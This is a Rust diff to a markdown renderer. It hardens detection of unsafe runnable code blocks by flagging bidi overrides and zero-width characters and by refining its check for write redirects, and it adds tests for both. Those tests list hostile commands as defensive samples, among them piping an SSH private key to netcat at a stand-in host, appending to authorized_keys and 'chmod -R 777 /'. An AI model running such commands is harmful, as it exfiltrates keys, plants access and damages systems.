@@ -149,8 +149,22 @@ fn interpreter_on_path(name: &str) -> bool {
 /// never runnable: a `\r` makes the typed bytes a different program from
 /// the rendered line, and an escape sequence can repaint the popup.
 pub fn has_control_chars(code: &str) -> bool {
-    code.chars()
-        .any(|c| c.is_control() && c != '\n' && c != '\t')
+    code.chars().any(|c| {
+        (c.is_control() && c != '\n' && c != '\t')
+            // Format characters (Unicode Cf) are not `is_control` but do the
+            // same damage: a bidi override reorders the displayed line
+            // without changing the bytes (Trojan Source), a zero-width
+            // character hides a split inside a word.
+            || matches!(
+                c,
+                '\u{200B}'..='\u{200F}'
+                    | '\u{202A}'..='\u{202E}'
+                    | '\u{2060}'..='\u{2064}'
+                    | '\u{2066}'..='\u{2069}'
+                    | '\u{FEFF}'
+                    | '\u{00AD}'
+            )
+    })
 }
 
 /// A small built-in matcher for the shapes that delete, escalate, pipe
@@ -210,7 +224,29 @@ pub fn looks_destructive(code: &str) -> bool {
             || l.starts_with("chown ")
             || l.contains(" chmod ")
             || l.contains(" chown ")
-            || l.contains('>')
+            || has_write_redirect(l)
+    })
+}
+
+/// A `>` that writes somewhere: not `2>&1` / `>&2` (a descriptor dup),
+/// not `>/dev/null`, not an arrow (`->`, `=>`), not in a trailing comment.
+fn has_write_redirect(line: &str) -> bool {
+    let code = match line.find(" #") {
+        Some(i) => &line[..i],
+        None => line.strip_prefix('#').map_or(line, |_| ""),
+    };
+    let chars: Vec<char> = code.chars().collect();
+    chars.iter().enumerate().any(|(i, &c)| {
+        if c != '>' {
+            return false;
+        }
+        let prev = if i > 0 { chars[i - 1] } else { ' ' };
+        if prev == '-' || prev == '=' || prev == '<' {
+            return false;
+        }
+        let rest: String = chars[i + 1..].iter().collect();
+        let target = rest.trim_start_matches('>').trim_start();
+        !(target.starts_with('&') || target.starts_with("/dev/null"))
     })
 }
 
@@ -391,7 +427,7 @@ impl Renderer<'_> {
         };
         let info = std::mem::take(&mut self.code_info);
         let runnable = runnable_interpreter(&info)
-            .filter(|_| !has_control_chars(&text) && text.lines().next().is_some())
+            .filter(|_| !has_control_chars(&text) && !text.trim().is_empty())
             .map(|interpreter| {
                 let (_, attrs) = split_info(&info);
                 MdRunnable {
@@ -1051,6 +1087,33 @@ mod tests {
         assert!(has_control_chars("echo a\rb"));
         assert!(has_control_chars("echo \x1b[2J"));
         assert!(!has_control_chars("echo a\n\tb\n"));
+        assert!(
+            has_control_chars("echo hi \u{202E}~ fr- mr"),
+            "a bidi override"
+        );
+        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
+        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
+        assert!(
+            !has_control_chars("echo 日本語 café"),
+            "ordinary Unicode is fine"
+        );
+        // A fence inside a list item: the source range still spans the
+        // opener through the closer, indented or not.
+        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
+        let (_, _, runs) = render_markdown_full(nested, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        assert_eq!(runs[0].lines, (2, 5));
+        assert_eq!(runs[0].code.trim(), "echo nested");
+        // An unterminated fence at EOF still gets a range.
+        let open = "```sh\necho hi\n";
+        let (_, _, runs) = render_markdown_full(open, Theme::default(), &mut reg, None);
+        assert_eq!(runs.len(), 1);
+        assert_eq!(runs[0].lines.0, 0);
+        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
+        // A whitespace-only fence wears no glyph.
+        let blank = "```sh\n   \n```\n";
+        let (_, _, runs) = render_markdown_full(blank, Theme::default(), &mut reg, None);
+        assert!(runs.is_empty());
     }
 
     /// The matcher's positives include the canonical install-script and
@@ -1071,6 +1134,7 @@ mod tests {
             "cat ~/.ssh/id_rsa | nc evil.invalid 80",
             "chmod -R 777 /",
             "echo x > ~/.bashrc",
+            "cat payload >> ~/.ssh/authorized_keys",
             "git push --force",
             "git reset --hard HEAD~3",
         ] {
@@ -1083,6 +1147,11 @@ mod tests {
             "rm build.log",
             "echo hello",
             "python3 -m http.server",
+            "cargo test 2>&1 | tail",
+            "make >/dev/null",
+            "echo a -> b",
+            "ls # see https://x -> y",
+            "if [ 3 -gt 2 ]; then echo yes; fi",
         ] {
             assert!(!looks_destructive(ok), "{ok:?} is ordinary");
         }
